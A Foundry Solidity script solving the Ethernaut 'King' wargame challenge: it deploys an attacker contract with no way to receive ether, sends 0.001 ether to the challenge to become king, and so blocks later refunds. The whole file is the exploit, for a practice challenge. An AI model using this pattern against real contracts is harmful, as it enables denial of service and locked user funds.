// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/09_King.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        KingAttacker kingAttacker = new KingAttacker{value:0.001 ether}(your_challenge_address);
        kingAttacker.attack();

        vm.stopBroadcast();
    }
}

contract KingAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        (bool success, ) = payable(challengeInstance).call{value: 0.001 ether}("");
    }
}